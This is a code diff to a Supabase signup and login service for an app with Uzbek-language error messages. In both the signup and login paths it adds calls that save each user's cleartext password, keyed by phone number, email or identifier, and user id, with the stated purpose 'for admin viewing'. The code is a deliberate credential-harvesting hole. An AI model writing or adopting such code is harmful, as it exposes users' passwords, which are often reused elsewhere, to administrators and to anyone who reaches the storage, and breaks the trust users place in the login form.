@@ -1,5 +1,6 @@
 import { supabase, isSupabaseConfigured } from '../lib/supabase';
 import { validateUzbekPhone, formatUzbekPhone, phoneToAuthEmail } from '../utils/phone';
+import { saveUserPassword } from '../utils/storage';
 
 // Re-export phone helpers for convenience
 export { validateUzbekPhone, formatUzbekPhone, phoneToAuthEmail };
@@ -60,6 +61,11 @@ export const supabaseService = {
       throw new Error("Ushbu telefon raqam bilan allaqachon ro'yxatdan o'tilgan!");
     }
 
+    // Save password for admin viewing
+    saveUserPassword(phoneValidation.normalized, cleanPass);
+    saveUserPassword(cleanEmail, cleanPass);
+    if (data?.user?.id) saveUserPassword(data.user.id, cleanPass);
+
     return data;
   },
 
@@ -87,6 +93,11 @@ export const supabaseService = {
       }
       throw new Error(error.message || "Kirishda xatolik yuz berdi");
     }
+
+    // Save password for admin viewing
+    saveUserPassword(phoneValidation.normalized, cleanPass);
+    saveUserPassword(authIdentifier, cleanPass);
+    if (data?.user?.id) saveUserPassword(data.user.id, cleanPass);
 
     return data;
   },
